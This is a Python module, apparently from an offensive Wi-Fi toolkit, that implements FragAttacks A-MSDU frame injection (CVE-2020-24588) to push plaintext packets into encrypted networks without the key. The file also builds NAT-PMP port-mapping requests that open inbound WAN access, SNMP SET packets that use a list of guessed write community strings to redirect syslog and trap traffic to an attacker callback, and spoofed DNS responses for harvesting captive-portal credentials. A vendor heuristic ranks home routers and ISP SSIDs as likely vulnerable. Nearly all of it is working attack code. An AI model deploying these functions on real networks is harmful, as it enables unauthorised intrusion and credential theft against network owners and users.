"""
injector.py — FragAttacks frame injection engine
CVE-2020-24586 / CVE-2020-24587 / CVE-2020-24588

Core technique (CVE-2020-24588 — A-MSDU aggregation):
  The A-MSDU present flag in 802.11 QoS Control is not authenticated by
  CCMP/GCMP. Setting this flag in a crafted frame causes the receiver to
  interpret the MSDU payload as a subframe containing an arbitrary ethernet
  frame — injecting plaintext into the network without the encryption key.

UDP-first design:
  TCP injection is unreliable without a completed handshake. All attack
  primitives here use UDP wherever possible:
    - NAT-PMP  (UDP 5351) — port mapping without UPnP TCP
    - SNMP     (UDP 161)  — device enumeration and config write
    - DNS      (UDP 53)   — response spoofing for portal harvest
    - SSDP     (UDP 1900) — service discovery
"""

import struct, socket, random
from typing import Optional

try:
    from scapy.all import RadioTap, Dot11, IP, UDP, TCP, DNS, DNSQR, DNSRR, Raw, sendp, conf
except ImportError:
    raise SystemExit("Install scapy: sudo apt install python3-scapy")

conf.verb = 0

# ── LLC/SNAP header (IPv4 over 802.11) ───────────────────────────────────────
LLC_SNAP_IP = b'\xaa\xaa\x03\x00\x00\x00\x08\x00'

# ── A-MSDU frame injection (CVE-2020-24588) ───────────────────────────────────

def _mac_bytes(mac: str) -> bytes:
    return bytes.fromhex(mac.replace(':', ''))

def _pad4(data: bytes) -> bytes:
    rem = len(data) % 4
    return data + b'\x00' * ((4 - rem) % 4)

def craft_amsdu_inject(ap_mac: str, client_mac: str, inner_ip_pkt_bytes: bytes):
    """
    QoS Data frame with A-MSDU flag (CVE-2020-24588).
    Receiver processes inner_ip_pkt_bytes as a legitimate local IP packet.
    Works against unpatched routers, IoT devices, Linux < 5.12.4.
    """
    ip_payload = LLC_SNAP_IP + inner_ip_pkt_bytes
    sub_dst    = _mac_bytes(client_mac)
    sub_src    = _mac_bytes(ap_mac)
    sub_len    = struct.pack('>H', len(ip_payload))
    amsdu_sub  = _pad4(sub_dst + sub_src + sub_len + ip_payload)
    qos_ctrl   = b'\x80\x00'   # A-MSDU present, TID=0

    return (
        RadioTap() /
        Dot11(type=2, subtype=8, FCfield=0x01,
              addr1=ap_mac, addr2=client_mac, addr3=ap_mac, SC=0) /
        Raw(load=qos_ctrl + amsdu_sub)
    )

def inject(iface: str, frame, count: int = 3, inter: float = 0.05):
    sendp(frame, iface=iface, count=count, inter=inter, verbose=False)

# ── NAT-PMP (RFC 6886) — UDP port mapping ─────────────────────────────────────
#
# NAT-PMP is supported by most home routers (Apple AirPort, many TP-Link,
# Netgear, ASUS). Unlike UPnP AddPortMapping it uses a single UDP datagram —
# no TCP handshake, works perfectly with frame injection.

NATPMP_PORT = 5351

def craft_natpmp_request(src_ip: str, router_ip: str,
                          int_port: int, ext_port: int,
                          proto: str = 'TCP', lifetime: int = 3600) -> bytes:
    """
    NAT-PMP external port mapping request.
    If the router accepts it, ext_port on the WAN is forwarded to
    src_ip:int_port — giving inbound access without the WiFi password.
    """
    opcode = 2 if proto.upper() == 'TCP' else 1   # 1=UDP, 2=TCP
    payload = struct.pack('!BBHHHI', 0, opcode, 0, int_port, ext_port, lifetime)
    pkt = (
        IP(src=src_ip, dst=router_ip) /
        UDP(sport=5350, dport=NATPMP_PORT) /
        Raw(load=payload)
    )
    return bytes(pkt)

def craft_natpmp_external_query(src_ip: str, router_ip: str) -> bytes:
    """Ask the router for its external (WAN) IP address via NAT-PMP."""
    payload = struct.pack('!BB', 0, 0)   # version=0, opcode=0
    pkt = (
        IP(src=src_ip, dst=router_ip) /
        UDP(sport=5350, dport=NATPMP_PORT) /
        Raw(load=payload)
    )
    return bytes(pkt)

# ── SNMP (UDP 161) — device enumeration and config write ──────────────────────
#
# SNMP uses UDP — no handshake, works with frame injection.
# SET requests reconfigure the target without needing a response.
# If write community is accepted, we can redirect syslog/trap traffic
# to our WAN IP, creating an outbound callback without TCP.

SNMP_WRITE_COMMUNITIES = [
    "private", "public", "admin", "write", "internal", "community",
    "manager", "cisco", "snmp", "password", "monitor", "all", "rw",
    "readwrite", "secret", "root", "",
]

SNMP_READ_COMMUNITIES = ["public", "read", "monitor", "guest", "default"]

# Standard MIB-II OIDs (all devices)
OID_SYS_DESCR    = ".1.3.6.1.2.1.1.1.0"   # read: device description
OID_SYS_NAME     = ".1.3.6.1.2.1.1.5.0"   # read/write: hostname
OID_SYS_LOCATION = ".1.3.6.1.2.1.1.6.0"   # read/write: location
OID_SYS_CONTACT  = ".1.3.6.1.2.1.1.4.0"   # read/write: contact
OID_INTERFACES   = ".1.3.6.1.2.1.2.1.0"   # read: interface count

# Vendor-specific syslog server OIDs (for outbound callback trigger)
SYSLOG_OIDS = [
    ".1.3.6.1.4.1.9.2.1.7.0",         # Cisco
    ".1.3.6.1.4.1.2636.3.18.1.4",      # Juniper
    ".1.3.6.1.4.1.11.2.14.11.5.1.29.1.2.1.4.1",  # HP/Aruba
    ".1.3.6.1.4.1.4526.11.13.1.1.0",   # Netgear
    ".1.3.6.1.4.1.3076.2.1.2.28.1.0",  # Alteon
    ".1.3.6.1.4.1.12356.101.4.1.6.0",  # Fortinet
]

# SNMP trap destination OIDs
TRAP_DEST_OIDS = [
    ".1.3.6.1.6.3.12.1.2.1.3.1",      # snmpTargetAddrTAddress (standard)
    ".1.3.6.1.4.1.9.9.41.1.2.3.1.5.1",# Cisco notification dest
    ".1.3.6.1.4.1.4526.11.1.1.12.0",  # Netgear trap server
]

# ── BER encoding (ASN.1 for SNMP) ────────────────────────────────────────────

def _ber_len(n: int) -> bytes:
    if n < 0x80:   return bytes([n])
    if n < 0x100:  return bytes([0x81, n])
    return bytes([0x82, (n >> 8) & 0xFF, n & 0xFF])

def _ber_seq(data: bytes, tag: int = 0x30) -> bytes:
    return bytes([tag]) + _ber_len(len(data)) + data

def _ber_int(n: int) -> bytes:
    if n == 0: return b'\x02\x01\x00'
    b = []
    v = n
    while v:
        b.append(v & 0xFF); v >>= 8
    b.reverse()
    if b[0] & 0x80: b.insert(0, 0)
    return b'\x02' + _ber_len(len(b)) + bytes(b)

def _ber_str(s) -> bytes:
    b = s.encode() if isinstance(s, str) else s
    return b'\x04' + _ber_len(len(b)) + b

def _ber_oid(oid_str: str) -> bytes:
    parts = list(map(int, oid_str.strip('.').split('.')))
    encoded = bytearray([40 * parts[0] + parts[1]])
    for part in parts[2:]:
        if part < 128:
            encoded.append(part)
        else:
            buf = []
            v = part
            while v:
                buf.append(v & 0x7F); v >>= 7
            buf.reverse()
            for i in range(len(buf) - 1):
                buf[i] |= 0x80
            encoded.extend(buf)
    return b'\x06' + _ber_len(len(encoded)) + bytes(encoded)

def _ber_ipaddr(ip: str) -> bytes:
    return b'\x40\x04' + bytes(map(int, ip.split('.')))

def _build_snmp(community: str, pdu_tag: int, request_id: int,
                varbinds: bytes) -> bytes:
    pdu = _ber_seq(
        _ber_int(request_id) + _ber_int(0) + _ber_int(0) +
        _ber_seq(varbinds),
        tag=pdu_tag
    )
    return _ber_seq(_ber_int(0) + _ber_str(community) + pdu)

def craft_snmp_get(src_ip: str, dst_ip: str, community: str, oid: str) -> bytes:
    """SNMP v1 GET — probe a device's OID (UDP, no handshake)."""
    rid = random.randint(1, 0x7FFFFFFF)
    vb  = _ber_seq(_ber_oid(oid) + b'\x05\x00')  # OID + NULL
    raw = _build_snmp(community, 0xa0, rid, vb)   # 0xa0 = GetRequest
    return bytes(IP(src=src_ip, dst=dst_ip) /
                 UDP(sport=random.randint(10000, 60000), dport=161) /
                 Raw(load=raw))

def craft_snmp_set_string(src_ip: str, dst_ip: str, community: str,
                           oid: str, value: str) -> bytes:
    """SNMP v1 SET with string value — write config to a device."""
    rid = random.randint(1, 0x7FFFFFFF)
    vb  = _ber_seq(_ber_oid(oid) + _ber_str(value))
    raw = _build_snmp(community, 0xa3, rid, vb)   # 0xa3 = SetRequest
    return bytes(IP(src=src_ip, dst=dst_ip) /
                 UDP(sport=random.randint(10000, 60000), dport=161) /
                 Raw(load=raw))

def craft_snmp_set_ip(src_ip: str, dst_ip: str, community: str,
                       oid: str, ip_value: str) -> bytes:
    """SNMP v1 SET with IP address value — redirect syslog/trap to our WAN IP."""
    rid = random.randint(1, 0x7FFFFFFF)
    vb  = _ber_seq(_ber_oid(oid) + _ber_ipaddr(ip_value))
    raw = _build_snmp(community, 0xa3, rid, vb)
    return bytes(IP(src=src_ip, dst=dst_ip) /
                 UDP(sport=random.randint(10000, 60000), dport=161) /
                 Raw(load=raw))

# ── DNS injection ─────────────────────────────────────────────────────────────

def craft_dns_spoof(src_ip: str, dst_ip: str, txid: int,
                    qname: str, spoof_ip: str) -> bytes:
    pkt = (
        IP(src=src_ip, dst=dst_ip) /
        UDP(sport=53, dport=1024) /
        DNS(id=txid, qr=1, aa=1, qdcount=1, ancount=1,
            qd=DNSQR(qname=qname),
            an=DNSRR(rrname=qname, ttl=60, rdata=spoof_ip))
    )
    return bytes(pkt)

# ── HTTP request injection ────────────────────────────────────────────────────
# NOTE: TCP-based. Useful only for fire-and-forget endpoints that process
# the request without needing to complete a handshake (rare). Kept as
# a last-resort fallback — prefer UDP attacks above.

def craft_http_request(src_ip: str, dst_ip: str, dst_port: int,
                        method: str, path: str,
                        headers: dict = None, body: str = "") -> bytes:
    hdrs = {"Host": dst_ip, "Content-Length": str(len(body))}
    if headers: hdrs.update(headers)
    hdr_str = "\r\n".join(f"{k}: {v}" for k, v in hdrs.items())
    payload = f"{method} {path} HTTP/1.1\r\n{hdr_str}\r\n\r\n{body}"
    pkt = (
        IP(src=src_ip, dst=dst_ip) /
        TCP(sport=54321, dport=dst_port, flags="PA", seq=1000, ack=1) /
        Raw(load=payload.encode())
    )
    return bytes(pkt)

# ── SSDP discovery ────────────────────────────────────────────────────────────

def craft_ssdp_discover(src_ip: str) -> bytes:
    body = (
        "M-SEARCH * HTTP/1.1\r\n"
        "HOST: 239.255.255.250:1900\r\n"
        'MAN: "ssdp:discover"\r\n'
        "MX: 1\r\nST: ssdp:all\r\n\r\n"
    )
    pkt = (
        IP(src=src_ip, dst="239.255.255.250", ttl=4) /
        UDP(sport=1900, dport=1900) /
        Raw(load=body.encode())
    )
    return bytes(pkt)

# ── Patch status heuristic ────────────────────────────────────────────────────

def estimate_patch_status(vendor: str, ssid: str) -> str:
    vendor = vendor.lower(); ssid = ssid.lower()
    patched   = ['cisco', 'aruba', 'ruckus', 'meraki', 'ubiquiti', 'unifi']
    vulnerable = ['tp-link', 'tplink', 'd-link', 'dlink', 'netgear', 'belkin',
                  'asus', 'linksys', 'tenda', 'xiaomi', 'huawei', 'zte', 'zyxel']
    if any(v in vendor for v in patched):     return 'possibly_patched'
    if any(v in vendor for v in vulnerable):  return 'likely_vulnerable'
    if any(k in ssid for k in ['sky', 'bt-', 'virgin', 'xfinity', 'att',
                                'spectrum', 'home', 'default']):
        return 'likely_vulnerable'
    return 'unknown'
